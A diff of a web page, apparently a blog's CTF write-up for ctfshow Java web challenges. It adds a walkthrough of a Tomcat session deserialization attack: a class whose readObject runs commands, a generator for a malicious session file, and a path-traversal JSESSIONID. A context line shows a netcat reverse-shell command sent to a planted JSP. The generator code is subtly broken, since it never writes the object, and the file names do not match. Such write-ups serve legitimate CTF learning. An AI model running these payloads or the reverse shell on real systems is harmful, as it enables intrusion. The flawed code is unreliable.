@@ -183,7 +183,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/Java" style=color:#ffa2c4>
+                <a href="/tags/Java" style=color:#879cff>
                     Java
                 </a>
             </span>
@@ -1262,6 +1262,73 @@ public class Payload &#123;
 </li>
 <li><p>访问hack.jsp传入<code>i=nc%20[IP]%206666%20-e%20sh</code></p>
 <img src="https://s3.bmp.ovh/imgs/2023/12/19/6b1c3643bf62a2b5.png" style="zoom:80%;" /></li>
+</ul>
+<h3 id="web858"><a href="#web858" class="headerlink" title="web858"></a>web858</h3><ul>
+<li><p>题目直接告诉了是tomcat的session反序列化，页面可以查看<code>context.xml</code>：</p>
+<img src="https://s3.bmp.ovh/imgs/2023/12/20/af398d6b551f2d09.png" style="zoom:80%;" /></li>
+<li><p>这里有一个user类的<code>readObject</code>方法可以命令执行</p>
+<pre><code class="java">package com.ctfshow.entity;
+ 
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+ 
+public class User implements Serializable &#123;
+    private static final long serialVersionUID = -3254536114659397781L;
+    private String username;
+    private String password;
+ 
+    public String getUsername() &#123;
+        return username;
+    &#125;
+    public void setUsername(String username) &#123;
+        this.username = username;
+    &#125;
+    public String getPassword() &#123;
+        return password;
+    &#125;
+    public void setPassword(String password) &#123;
+        this.password = password;
+    &#125;
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;
+        in.defaultReadObject();
+        Runtime.getRuntime().exec(this.username);
+    &#125; 
+&#125;
+</code></pre>
+</li>
+<li><p>可以上传文件，上传后会返回文件路径</p>
+</li>
+<li><p>因此如果上传1.session，那么当<code>JSESSIONID</code>为<code>1.session</code>上传路径时，会触发反序列化</p>
+</li>
+<li><p>生成session文件：</p>
+<pre><code class="java">package com.ctfshow.entity;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+
+public class Payload &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        User user = new User();
+        Class&lt;? extends User&gt; aClass = user.getClass();
+        Field username = aClass.getDeclaredField(&quot;username&quot;);
+        username.setAccessible(true);
+        username.set(user,&quot;cp /flag /usr/local/tomcat/webapps/ROOT/1.jsp&quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;1.session&quot;));
+        objectOutputStream.close();
+
+    &#125;
+&#125;
+</code></pre>
+</li>
+<li><p>文件路径为：<code>/usr/local/tomcat/webapps/ROOT/WEB-INF/upload/aaa.session</code></p>
+</li>
+<li><p>抓包修改：<code>JSESSIONID=../../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/upload/aaa</code></p>
+</li>
+<li><p>访问<code>1.jsp</code></p>
+<img src="https://s3.bmp.ovh/imgs/2023/12/20/4d4d4235b5716e5f.png" style="zoom:80%;" /></li>
 </ul>
 
     </div>
